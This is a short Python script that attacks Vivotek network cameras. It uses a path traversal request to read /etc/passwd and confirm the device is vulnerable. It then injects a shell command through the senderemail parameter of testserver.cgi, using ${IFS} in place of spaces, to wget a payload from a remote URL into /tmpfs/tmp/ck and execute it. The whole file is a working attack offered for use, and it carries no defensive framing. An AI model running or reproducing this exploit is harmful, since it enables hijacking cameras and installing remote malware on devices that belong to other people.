import sys, socket

#'${IFS}'=' '  '|tee'='>'
downloadurl = 'http://s'
	
def exploit(ip,port):
	uri = "GET /cgi-bin/admin/testserver.cgi?type=email&address=127.0.0.1&port=25&sslmode=0&senderemail=`wget${IFS}" + downloadurl +"${IFS}-O${IFS}/tmpfs/tmp/ck;chmod${IFS}777${IFS}/tmpfs/tmp/ck;./ck`&recipientemail=1\r\n\r\nhost: " + ip + "\r\n\r\n"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(uri)
	data = s.recv(4096)
	
def checkvul(ip):
	for port in [80, 8080]:
		try:
			url = "GET /cgi-bin/admin/downloadMedias.cgi?/mnt/auto/../../etc/passwd HTTP/1.1\r\nHost:" + host + "\r\n\r\n"
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((host,port))
			s.send(url)
			data=s.recv(4096)
			if data.find("filename=passwd")>-1 and data.find("Content-length:23"):
				exploit(ip,port)
			else:
				return
		except:
			print 'False'+'\n'
			continue

if __name__ == '__main__':
	if sys.argv[1]:
		checkvul(sys.argv[1])
	else:
		print '[+] Use python vivotek.py 8.8.8.8'